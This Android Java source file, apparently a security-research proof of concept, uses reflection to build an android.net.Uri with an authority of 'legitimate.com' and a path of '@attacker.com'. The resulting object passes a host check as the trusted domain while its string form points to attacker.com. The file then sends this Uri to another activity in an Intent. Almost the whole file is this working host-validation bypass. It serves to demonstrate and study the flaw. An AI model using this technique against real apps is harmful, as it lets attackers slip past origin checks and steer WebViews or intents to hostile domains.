package bar.gtfo.webview.javareflectionattack;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.lang.reflect.Constructor;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri;
        try {
            Class partClass = Class.forName("android.net.Uri$Part");
            Constructor<?>[] constructorArray = partClass.getDeclaredConstructors();
            Integer len = constructorArray.length;
            Constructor partConstructor = constructorArray[0];
            partConstructor.setAccessible(true);

            Class pathPartClass = Class.forName("android.net.Uri$PathPart");
            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];
            pathPartConstructor.setAccessible(true);

            Class hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");
            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];
            hierarchicalUriConstructor.setAccessible(true);

            Object authority = partConstructor.newInstance("legitimate.com", "legitimate.com");
            Object path = pathPartConstructor.newInstance("@attacker.com", "@attacker.com");
            uri = (Uri) hierarchicalUriConstructor.newInstance("https", authority, path, null, null);
        }
        catch (Exception e) {
            throw new RuntimeException(e);
        }

        Intent intent = new Intent();
        intent.setData(uri);
        intent.setClass(this, TestActivity.class);
        startActivity(intent);
    }
}